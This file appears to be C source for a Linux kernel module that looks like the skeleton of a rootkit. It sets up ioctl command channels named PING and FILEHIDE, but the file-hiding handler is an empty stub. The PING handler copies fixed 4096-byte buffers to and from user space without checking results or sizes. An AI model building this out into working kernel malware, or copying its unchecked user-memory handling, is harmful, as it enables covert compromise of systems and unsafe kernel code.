#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>

#include "common.h"
#include "ioctl.h"

#define BUFLEN 4096

static char buf[BUFLEN];

void
report_channels(void)
{
    DEBUG_NOTICE("-----------------------------------\n");
    DEBUG_NOTICE("listening on the following channels\n");
    DEBUG_NOTICE("%-24s %#10lx\n", "PING",     G7_PING);
    DEBUG_NOTICE("%-24s %#10lx\n", "FILEHIDE", G7_FILEHIDE);
    DEBUG_NOTICE("-----------------------------------\n");
}

channel
detect_channel(unsigned int cmd)
{
    switch (cmd) {
    case G7_PING:     return (channel){ "PING",     handle_ping     };
    case G7_FILEHIDE: return (channel){ "FILEHIDE", handle_filehide };
    }

    return (channel){ "unknown", NULL };
}

int
handle_ping(unsigned long arg)
{
    copy_from_user(buf, (const char *)arg, BUFLEN);
    if (!strcmp("PING", buf)) {
        buf[1] = 'O';
        copy_to_user((char *)arg, buf, BUFLEN);
    }

    return 0;
}

int
handle_filehide(unsigned long arg)
{
    return 0;
}
